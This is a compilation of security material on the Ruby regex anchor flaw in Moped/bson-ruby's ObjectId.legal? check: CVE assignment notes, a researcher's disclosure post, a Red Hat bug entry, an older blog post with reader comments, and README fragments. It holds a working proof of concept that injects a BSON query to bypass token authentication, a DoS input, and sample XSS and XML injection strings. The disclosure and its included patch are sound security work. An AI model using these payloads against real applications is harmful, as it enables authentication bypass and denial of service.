As far as we can tell, this requires three CVE IDs because there were
three independent mistakes.

CVE-2015-4410 is for original 2012-01-23 implementation of legal?
using the ^[0-9a-f]{24}$ regular expression.

CVE-2015-4411 is for the bernerdschaefer 2012-04-17 commit in which
legal? began using the \A\h{24}\Z regular expression. The
mongo_ruby_regexp.html blog post describes this as "proper" but later
explains that it was problematic, in at least one context, because of
a minor DoS that would have been avoided if the correct \A\h{24}\z
(lowercase 'z') had been used instead.

CVE-2015-4412 is for the durran 2013-04-07 commit in which the
\A\h{24}\Z regular expression was changed to the ^[0-9a-f]{24}$
regular expression.

The copying of the original ^[0-9a-f]{24}$ mistake from Moped::BSON to
one or more other codebases doesn't require additional CVE IDs.

Similarly, the copying of the \A\h{24}\Z mistake or the second
^[0-9a-f]{24}$ mistake to one or more other codebases doesn't require
additional CVE IDs. (It's quite possible that no such copying ever
occurred.)

The claim in
<http://homakov.blogspot.ru/2012/05/saferweb-injects-in-various-ruby.html>
of:

  Regexp are just like cars - they should work as same and similar as
  it's possible. Breaking standard behavior by purpose and telling
  people "It's not a bug, it's a feature" looks so disgusting to me.
  It's not a feature, it's a vulnerability.

is not accepted as a Ruby vulnerability by the CVE project. There is
no CVE ID for the observation that Ruby regular-expression semantics
can be considered different from regular-expression semantics seen
elsewhere.

If there are other products (that otherwise qualify for CVE IDs) with
incorrect and security-relevant uses of ^$ in Ruby code, then there
can be additional CVE IDs for each independent codebase. For example,
referring to the "Showcases time" section of the
saferweb-injects-in-various-ruby.html page, there can't be a CVE ID
for GitHub.com (because it could be site-specific code) but there
could be a CVE ID if the issue affected a 2012 version (if one
existed) of the GitHub Enterprise product.

# Mongo BSON Injection: Ruby Regexps Strike Again

TL;DR There’s a subtle bug in BSON-ruby implementation, leading in best case scenario to low-severity DoS, **but most likely to critical BSON Injection** (similar to SQL injection) - depends on gem versions you use.

3 years ago [I wrote a blog post](https://homakov.blogspot.ru/2012/05/saferweb-injects-in-various-ruby.html) about broken regular expressions in Ruby, `^$` meaning new lines `\n`. Back then I was only able to demonstrate XSS on Github and other websites using “javascript:a()\nhttps://”. I had a feeling there are much worse use cases of this vulnerability and here it is.

## Briefly About Gems

BSON is a binary-encoded serialization of JSON-like documents. MongoDB uses BSON as the data storage and network transfer format for “documents”.

Mongoid is an ODM (Object Document Mapper) Framework for MongoDB, written in Ruby. Mongo Mapper is another ODM but less popular one.

Moped gem is A MongoDB driver for Ruby.

So Mongoid uses more low-level adapter Moped which uses BSON-ruby (but used to have its own implementation). Mongo Mapper uses Plucky for parsing ObjectId, which also uses BSON-ruby.

Most likely you’re using Mongoid or Mongo Mapper, but technically the vulnerability is in `legal?` of BSON::ObjectId.

## A Tale of One Regression

`legal?` was created in Moped::BSON on Jan 23, 2012. It intended to verify the \_id from user input is hexdecimal and is exactly 24 symbols. It looked like this:

```
def legal?(str)
  !!str.match(/^[0-9a-f]{24}$/i)
end
```

But this nasty `^$`-using Ruby code didn’t survive long - [on Apr 17, 2012 it was silently replaced](https://github.com/mongoid/moped/commit/dd5a7c14b5d2e466f7875d079af71ad19774609b#diff-3b93602f64c2fe46d38efd9f73ef5358R24) with proper `!!str.match(/\A\h{24}\Z/i)`

However, on March 31, 2013 Moped deleted internal BSON module and [switched to separate BSON gem](https://github.com/mongoid/moped/commit/b64f937590c69d72fa92255e4c66d3ec126b0ff5#diff-c299a9622b71e55450c761f853668d61R6)

![](/img/moped.png)

The `legal?` method successfully [migrated to mongodb/bson-ruby](https://github.com/mongodb/bson-ruby/commit/fef6f75413511d653c76bf924a932374a183a24f#diff-8c8558c185bbb548ccb5a6d6ac4bfee5R191) before that (on March 3).

But on Apr 7 [an interesting commit happens](https://github.com/mongodb/bson-ruby/commit/21141c78d99f23d5f34d32010557ef19d0f77203#diff-8c8558c185bbb548ccb5a6d6ac4bfee5L219). @durran (the maintainer of all those repos), replaces `/\A\h{24}\Z/ === string.to_s` with vulnerable `string.to_s =~ /^[0-9a-f]{24}$/i ? true : false`.

So from Apr 17 2012 to March 31 2013 moped used ^$, \A\Z until Apr 7 2013, and then ^$ until now.

## Am I Vulnerable?

I see, you’re getting bored. Run this code to see if you’re vulnerable:

```
b=((defined?(Moped::BSON) ? Moped::BSON : BSON)::ObjectId)
raise "DoS!" if b.legal? "a"*24+"\n"
raise "Injection!" if b.legal? "a"*24+"\na"
```

And use this patch if you indeed are! Don’t forget to alert others.

```
def ((defined?(Moped::BSON) ? Moped::BSON : BSON)::ObjectId).legal?(s)
  /\A\h{24}\z/ === s.to_s
end
```
## The Vulnerability

If you’re lucky enough and use old version of Moped, only light version of DoS is possible.

Wait, did I mention another reason why Regexps in Ruby are horribly designed? There’s \A meaning the beginning and there’s \Z meaning the ending… or a new line. You’re supposed to know it. Because only \z means the ending. But most people don’t care the last `\n`.

![](/img/moped2.png)

So if you send something like `aaaaaaaaaaaaaaaaaaaaaaaa%0A` (with trailing `\n`), the `legal?` method will still return `true` because \Z allows the new line. But when Mongo DB receives a corrupted ObjectId it responds with `[conn1] Assertion: 10307:Client Error: bad object in message: invalid bson type in object with _id: ObjectId('aaaaaaaaaaaaaaaaaaaaaaaa')`.

Which would be OK if Moped properly reacted, but currently it thinks Mongo is down and pings it 39 more times with intervals. In other words it keeps the worker busy for 5 seconds and makes x40 requests to Mongo DB. One way or another, it is Denial of Service.

But if you’re using a newer version of BSON-ruby with ^$, the attacker can send any data to the socket with something like \_id=`Any binary data\naaaaaaaaaaaaaaaaaaaaaaaa\nAny binary data`. With following PoC we can bypass any auth token-based system, easily DoS your app, and probably more nasty things - we can write any kind of requests to the socket!

```
require 'uri'
b = BSON::Document.new
b["$query"] = {"token" => {"$gt"=>""}}

payload = b.to_bson[4..-2]
id_ish = ("\n\n" + "a"*24 + "\n\n")

fake_id = "a"*24 +
  "\x02_id\0".unpack('H*')[0] +
  [id_ish.size/2 + 1].pack('V').unpack('H*')[0] + id_ish + "00" +
  payload.unpack('H*')[0]

puts URI.encode(fake_id) # looks like:
# aaaaaaaaaaaaaaaaaaaaaaaa025f6964000f000000%0A%0Aaaaaaaaaaaaaaaaaaaaaaaaa%0A%0A0003247175657279001b00000003746f6b656e000f000000022467740001000000000000

User.find fake_id #returns <User _id: 556f840f686f6d6746000000, token: "a">
```

Thanks to [@judofyr](https://twitter.com/judofyr) for the help with this PoC!

ObjectId is unpacked from hex string and injected as-is into the socket (not sanitized for performance reasons, it’s supposed to be valid ObjectId). It breaks BSON format and redefines or defines new parameters of the BSON object.

\x83\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xD4\a\x00\x00\x00\x00\x00\x00

Implications of this vulnerability can be huge, so patch your systems asap. Another post about dangers of BSON is coming soon, and that one impacts all platforms.

Is the 1.x series going to see a patch? Users who aren't using bson\_ext (such as users on JRuby) are still vulnerable.

| [Description](show_bug.cgi?id=1229706#c0)  Vasyl Kaigorodov    2015-06-09 13:25:01 UTC  ``` The following Denial of Service issue was discovered in Moped Ruby gem:  If a crafted value will be passed to Moped::BSON::ObjecId.legal? method, this will cause Moped to think MongoDB is down, and ping it 39 more times with intervals. In other words, Moped will keep a worker busy for 5 seconds and make x40 requests to MongoDB.  [CVE-2015-4411](https://access.redhat.com/security/cve/CVE-2015-4411) was assigned to it: <http://seclists.org/oss-sec/2015/q2/653>  Additional details might be found here: <http://sakurity.com/blog/2015/06/04/mongo_ruby_regexp.html>  The fix can be found here: <https://github.com/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999>   ```  [Comment 2](show_bug.cgi?id=1229706#c2)  Vasyl Kaigorodov    2015-06-09 13:27:07 UTC  ```  Created rubygem-moped tracking bugs for this issue:  Affects: fedora-all [[bug 1229708](show_bug.cgi?id=1229708 "CLOSED ERRATA - CVE-2015-4411 rubygem-moped: Denial of Service with crafted ObjectId string [fedora-all]")]   ```  [Comment 3](show_bug.cgi?id=1229706#c3)  Fedora Update System    2015-07-14 15:47:31 UTC  ``` rubygem-moped-1.5.3-1.fc22 has been pushed to the Fedora 22 stable repository.  If problems still persist, please make note of it in this bug report.   ```  [Comment 4](show_bug.cgi?id=1229706#c4)  Fedora Update System    2015-07-14 15:51:28 UTC  ``` rubygem-moped-1.5.3-1.fc21 has been pushed to the Fedora 21 stable repository.  If problems still persist, please make note of it in this bug report.   ```  [Comment 5](show_bug.cgi?id=1229706#c5)  Fedora Update System    2015-07-23 19:11:48 UTC  ``` rubygem-moped-1.5.3-1.el7 has been pushed to the Fedora EPEL 7 stable repository.  If problems still persist, please make note of it in this bug report.   ```  [Comment 6](show_bug.cgi?id=1229706#c6)  Kurt Seifried    2015-07-29 22:21:04 UTC  ``` Statement:  This issue affects the versions of rubygem-moped as shipped with Red Hat OpenShift Enterprise 2.x. Red Hat Product Security has rated this issue as having Low security impact. Additionally access to the component using rubygem-moped is restricted, only trusted users and systems can send messages, thus no trust boundary violation occurs and this issue can not easily be used to create an exploitable security vulnerability on Red Hat OpenShift Enterprise 2.   ``` |  |

... there shouldn t be a limit at
all. Perhaps implement pages where the user can show records *201* .. 400, 401 .. 600, etc. Right now it seem to show the
oldest 200, truncating new *cves*.

### Injects in Various Ruby Websites Through Regexp.

[On HN](http://news.ycombinator.com/item?id=3996127)

You are a web developer. Let's assume you are building a website using Ruby(and probably Rails or any other Ruby framework). This is why you need to validate some input params - to make sure that they don't contain any crap you don't want to be there. Come on, you are going to google it, right?:

1. Hmmm I need a regexp for emails. Googling: "regexp for email". Oh, nice one, I will use it.
2. Oh, I also seek a regexp for URLs. Easy: "regexp for url". So good, I love google and ruby!
3. This field must contain 3 capital letters - it's IATA code for an airport. I can do it by myself, I know regular expressions, I read some books! /^[A-Z]{3}$/ looks great!

Now you have ready regexps and you put them into your model, into controller, anywhere - it doesn't matter:
> validates :email, presence: true, format: EMAIL regexp from google
>
> validates :url, format: URL regexp from google
>
> validates :departure\_airport, presence: true, format: /^[A-Z]{3}$/

You can even test it tens times in console or development ENV - it will work... unless you know "the secret" with ruby Regexp.

**^ for start-of-string and $ for end-of-string ARE just new lines - \n!**

This is a common pattern to exploit them:
> any data
>
> proper data - valid for regexp
>
> any other data

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjGIzTZOZ_bYkfCPPbEjRUtN5VZY6h0L1q9dAGaLS-UFU2hCzd1NnKNNc4CAeZPUltnUJ7sJLj8s7S-GnnBtNY3kABnYBWdgoWtE4KzsUNX3mLJ0TDMvj6T9Qajqel-_BhxggVncM6-PvPW/s640/Screen+Shot+2012-05-19+at+10.06.06+AM.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjGIzTZOZ_bYkfCPPbEjRUtN5VZY6h0L1q9dAGaLS-UFU2hCzd1NnKNNc4CAeZPUltnUJ7sJLj8s7S-GnnBtNY3kABnYBWdgoWtE4KzsUNX3mLJ0TDMvj6T9Qajqel-_BhxggVncM6-PvPW/s1600/Screen%2BShot%2B2012-05-19%2Bat%2B10.06.06%2BAM.png)

Thus, all your regexps that use ^$ are CRAP and worth nothing! Throw them away, they don't make sure that input is safe and secure.

**XSS for your URL:**

> javascript:alert(1);exploit\_code();/\*
>
> http://hi.com
>
> \*/

**Inject for IATA code(it uses SOAP so some XML inject has very powerful impact):**
> <some xml><for reservation system to steal money>
>
> SXF
>
> </ending tags></going to [miami beach](//www.youtube.com/watch?v=Wg1V2OZL2Ho)>

Ruby doesn't give a sh\*t about it at all. "Meh, use \A \z, we are in multiline mode by default".

The vulnerability is known and described [in just a few paragraphs at rails security guide](http://guides.rubyonrails.org/security.html#regular-expressions). Example  is awful - why to add <script> to file name? Rails will escape it in html\_safe easily. Much better to demonstrate XSS in URL, Shell Inject or XML inject because they all are pretty dangerous.

You bought a car, you are driving on a highway, faster and faster. Then you see the wall - you are trying to stop the car asap.

Hey dude, didn't you read **300pages-manual? Page 253**: "Brake is located on the roof of the car". pwned.

Regexp are just like cars - they should work as same and similar as it's possible. Breaking standard behavior by purpose and telling people "It's not a bug, it's a feature" looks so disgusting to me. **It's not a feature, it's a vulnerability**.
## **Showcases time.**

That's it! Of course I can find much more - but for what? I am 90% sure that your ruby project uses $^ in URL regexp too. I am so much sure because I would do the same, and this is really OK. Old versions of devise and authlogic and a lot of other gems are built with vulnerable regexps.

**This is how to check:**You have <input> field. Just turn it into <textarea> using WebInspector - now you can use new lines w/o all the mess with \n and %0A.

   I thought everybody knew to use \A \z in Ruby since forever. ^ and $ and pretty much always the wrong thing to use, and not just due to security.

   @taw
   I hope it to be true. But it's not. MOST of rubyists don't know about this and there is no way to teach everybody. Stop fighting walls, you cannot rewrite standards!

   "I thought everybody knew" is really my favorite sentence in security. I heard it a lot and had some fun then.

   Good research, Egor!
   I'm not Ruby programmer, but from time to time I read pieces of Ruby code. And I really even could not imagine before read your post that these ^$ has so perversive sense in regexp in Ruby.

   This actually doesn't have anything to do with Ruby specific, but it is how regular expression work in general. So personally I've always expected ^ and $ to mean start of line and end of line and never start and end of text.

   This is the case in every programming language I've worked in that has regular expressions, such as Ruby, Perl, Java, C# and others. Multiline matching is also optional on all these platforms.

     All of the languages you mention (except Ruby) treat ^ and $ as beginning/end of string until you \*explicitly\* enable MULTILINE (/m). Where did you get the idea that they don't?

   Nce except the suggestion to change the Ruby regexp behavior. It's naive to think regexps are used only for valiadations. And since there is always \A \Z solution, it's simply user/dev error.

    @dbussink
    yes, I know, this is how regexp work. It's all just "details". The problem is multiline mode by default, that was I meaning.

    And I am personally OK with that. I use \A\z. But all silly books/casts I know about regex use ^$ - that's the point. It's impossible to change minds rapidly. Very difficult.

    Thanks for your response.

    @anon
    OK I don't mind changing ruby/minds. I mind fixing the problem. And I don't know 100% which of the ways will work. But I know my post will help people who never knew about this - I hope it was helpful to them :)

    @anon yep, I would not care at all in the case if some other language would do the same. But in this case ruby is "unique" in the bad meaning of that word.

    Thanks for attracting on the problem.

    I thing, that Ruby is a good language, but many people writing Rails tutorials on the web dont know some its differences. This problem was discussed in 2009 on http://caiustheory.com/validating-data-with-regular-expressions-in-ruby

    Good Lord! Keep the ignorance and misdirection coming folks.

    Keep blaming other people/software because you didn't bother to learn standard RegEx syntax that has been around for at least a couple decades.

    Please don't allow any critical thinking into your head or you might realize that the distinction between \A and ^ is both necessary and useful.

    Thanks for bringing this to my attention homakov, however, I will not be clamoring for a change to Ruby, rather I will be on the lookout for this in my code and fixing it. What you overlook is that Ruby is not only used for rails, and regular expressions are not only used for web input validation, and regular expressions have been around since before the web. Sure we could change the way ^ and $ act in Ruby, thus making Ruby's regular expressions act differently from every other language's, and breaking lots of existing non-web-app code. No. The answer is that the habit of using $ and ^ to mean beginning and end is a habit inherited from writing command-line scripts where programmers were able to assume line-by-line input. The solution is to do what you have already done here and bring this to people's attention so they can stop making this mistake. Changing minds might be harder than changing Ruby, but it's the right thing to do.

    According to http://www.regular-expressions.info/javascript.html, \A and \Z is not even supported in the javascript regular expression flavour. They would be used to $ and ^. For a web developer proficient in javascript trying to pick up Ruby, this is a problem just waiting to pop up.

    @Anonymous - but in JavaScript there isn't such an issue:
    "javascript:pwn();\nhttp://hi.com".match(/^http:/) # => null

    Coming back to Ruby:
    require "uri"
    irb> "javascript:pwn();\nhttp://hi.com" =~ URI.regexp
    => 0

    Oh noes!!!

    (URI.regexp seems a pretty complex regexp)

    @anon1 that is silly reason
    @anon2 you don't teach me standards ok? I know it pretty well. I'm just telling obvious stuff that new comers used to use ^$, all the books use it etc. Standard < what people used too. Sad but true
    @charles absolutely right. I don't really even hope to change ruby but with this post i make people \*a little bit\* more aware about this vulnerability
    @anon3 nice catch!
    @Jarmo yes as in others languages, no multiline by default

    To reflect...

    ^ and $ = http://regexr.com?312k1
    \S and \z = http://regexr.com?312k4
    \A and \s = http://regexr.com?312kd

    That's a Ruby problem or just how the regex works?

    @Guilheme
    in fact it is how RegExp work. Just ruby has multiline mode by default, it turns ^$ into useless new lines. That's what this post is about.

    Egor, $ is not exactly the same as \z in non-Ruby world, because $ matches newline too.

    The "start of line" metacharacter (^) matches only at the start of the string, while the "end of line" metacharacter ($) matches only at the end of the string, OR BEFORE a terminating newline. This is right for Perl, PHP, Python etc. But \z is end of subject.

    So maybe it should be better to teach the rest of the programmers to use \z instead of $.

    @david yes you are telling what I know perfectly. It's just slight details. OK. Just ruby is only guy who uses multiline by default.

    As it has been said, Ruby is used not only for Rails and pretty obviously that'd break backwards compatibility in quite a hard way. This won't be in 2.0 and probably not any soon either.

    But you could easily fix Rails by checking for these broken regexen in the validator.

    Just got an exception in my Rails 4 beta application about some security risk... I am really, really surprised with these multiline regexps in Ruby. For me it's a terrible design bug, few would EVER think multiline regexps are enabled by default.

    I'm actually upset about this. It's the blind leading the blind out there when it comes to regexes - EVERY tutorial states that $ will ONLY match the end of a string. \*facepalm\*

| [Description](show_bug.cgi?id=1229706#c0)  Vasyl Kaigorodov    2015-06-09 13:25:01 UTC  ``` The following Denial of Service issue was discovered in Moped Ruby gem:  If a crafted value will be passed to Moped::BSON::ObjecId.legal? method, this will cause Moped to think MongoDB is down, and ping it 39 more times with intervals. In other words, Moped will keep a worker busy for 5 seconds and make x40 requests to MongoDB.  [CVE-2015-4411](https://access.redhat.com/security/cve/CVE-2015-4411) was assigned to it: <http://seclists.org/oss-sec/2015/q2/653>  Additional details might be found here: <http://sakurity.com/blog/2015/06/04/mongo_ruby_regexp.html>  The fix can be found here: <https://github.com/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999>   ```  [Comment 2](show_bug.cgi?id=1229706#c2)  Vasyl Kaigorodov    2015-06-09 13:27:07 UTC  ```  Created rubygem-moped tracking bugs for this issue:  Affects: fedora-all [[bug 1229708](show_bug.cgi?id=1229708 "CLOSED ERRATA - CVE-2015-4411 rubygem-moped: Denial of Service with crafted ObjectId string [fedora-all]")]   ```  [Comment 3](show_bug.cgi?id=1229706#c3)  Fedora Update System    2015-07-14 15:47:31 UTC  ``` rubygem-moped-1.5.3-1.fc22 has been pushed to the Fedora 22 stable repository.

If problems still persist, please make note of it in this bug report.   ```  [Comment 6](show_bug.cgi?id=1229706#c6)  Kurt Seifried    2015-07-29 22:21:04 UTC  ``` Statement:  This issue affects the versions of rubygem-moped as shipped with Red Hat OpenShift Enterprise 2.x. Red Hat Product Security has rated this issue as having Low security impact. Additionally access to the component using rubygem-moped is restricted, only trusted users and systems can send messages, thus no trust boundary violation occurs and this issue can not easily be used to create an exploitable security vulnerability on Red Hat OpenShift Enterprise 2.   ``` |  |

|  |  |  |
|  |  | \* Automated replica set node discovery and failover. |
|  |  | \* No C or Java extensions |
|  |  | \* No external dependencies |
|  |  | \* Simple, stable, public API. |

|  |  | \* GridFS |
|  |  | \* Map/Reduce |
|  |  |  |
|  |  | These features are possible to implement, but outside the scope of Moped's |
|  |  | goals. Consider them perfect opportunities to write a companion gem! |

|  |  |  |
|  |  | Here's a list of the exceptions generated by Moped. |
|  |  |  |
|  |  | <table><tbody> |

|  |  | <tr><th>Moped::Errors::ConnectionFailure</th> |

|  |  | safe mode.</td></tr> |

|  |  | of a node's networking code. Allows you to `rescue Moped::SocketError` which |
|  |  | preserving the real exception.</td></tr> |
|  |  |  |
|  |  | </tbody></table> |
|  |  |  |
|  |  | Other exceptions are possible while running commands, such as IO Errors around |
|  |  | failed connections. Moped tries to be smart about managing its connections, |
|  |  | such as checking if they're dead before executing a command; but those checks |
|  |  | aren't foolproof, and Moped is conservative about handling unexpected errors on |
|  |  | its connections. Namely, Moped will \*not\* retry a command if an unexpected |
|  |  | exception is raised. Why? Because it's impossible to know whether the command |
|  |  | was actually received by the remote Mongo instance, and without domain |
|  |  | knowledge it cannot be safely retried. |
|  |  |  |
|  |  | Take for example this case: |
|  |  |  |
|  |  | ```ruby |
|  |  | session.with(safe: true)["users"].insert(name: "John") |
|  |  | ``` |
|  |  |  |
|  |  | It's entirely possible that the insert command will be sent to Mongo, but the |
|  |  | connection gets closed before we read the result for `getLastError`. In this |
|  |  | case, there's no way to know whether the insert was actually successful! |
|  |  |  |
|  |  | If, however, you want to gracefully handle this in your own application, you |
|  |  | could do something like: |
|  |  |  |
|  |  | ```ruby |
|  |  | document = { \_id: Moped::BSON::ObjectId.new, name: "John" } |
|  |  |  |
|  |  | begin |
|  |  | session["users"].insert(document) |
|  |  | rescue Moped::Errors::SocketError |
|  |  | session["users"].find(\_id: document[:\_id]).upsert(document) |
|  |  | end |
|  |  | ``` |
|  |  |  |
|  |  | # Replica Sets |
|  |  |  |
|  |  | Moped has full support for replica sets including automatic failover and node |
|  |  | discovery. |
|  |  |  |
|  |  | ## Automatic Failover |
|  |  |  |
|  |  | Moped will automatically retry lost connections and attempt to detect dead |
|  |  | connections before sending an operation. Note, that it will \*not\* retry |
|  |  | individual operations! For example, these cases will work and not raise any |
|  |  | exceptions: |
|  |  |  |
|  |  | ```ruby |
|  |  | session[:users].insert(name: "John") |
|  |  | # kill primary node and promote secondary |
|  |  | session[:users].insert(name: "John") |
|  |  | session[:users].find.count # => 2.0 |
|  |  |  |
|  |  | # primary node drops our connection |
|  |  | session[:users].insert(name: "John") |
|  |  | ``` |
|  |  |  |
|  |  | However, you'll get an operation error in a case like: |
|  |  |  |
|  |  | ```ruby |
|  |  | # primary node goes down while reading the reply |
|  |  | session.with(safe: true)[:users].insert(name: "John") |
|  |  | ``` |
|  |  |  |
|  |  | And you'll get a connection error in a case like: |
|  |  |  |
|  |  | ```ruby |
|  |  | # primary node goes down, no new primary available yet |
|  |  | session[:users].insert(name: "John") |
|  |  | ``` |
|  |  |  |
|  |  | If your session is running with eventual consistency, read operations will |
|  |  | never raise connection errors as long as any secondary or primary node is |
|  |  | running. The only case where you'll see a connection failure is if a node goes |
|  |  | down while attempting to retrieve more results from a cursor, because cursors |
|  |  | are tied to individual nodes. |
|  |  |  |
|  |  | When two attempts to connect to a node fail, it will be marked as down. This |
|  |  | removes it from the list of available nodes for `:down\_interval` (default 30 |
|  |  | seconds). Note that the `:down\_interval` only applies to normal operations; |
|  |  | that is, if you ask for a primary node and none is available, all nodes will be |
|  |  | retried. Likewise, if you ask for a secondary node, and no secondary or primary |
|  |  | node is available, all nodes will be retreied. |
|  |  |  |
|  |  | ## Node Discovery |
|  |  |  |
|  |  | The addresses you pass into your session are used as seeds for setting up |
|  |  | replica set connections. After connection, each seed node will return a list of |
|  |  | other known nodes which will be added to the set. |
|  |  |  |
|  |  | This information is cached according to the `:refresh\_interval` option (default: |
|  |  | 5 minutes). That means, e.g., that if you add a new node to your replica set, |
|  |  | it should be represented in Moped within 5 minutes. |
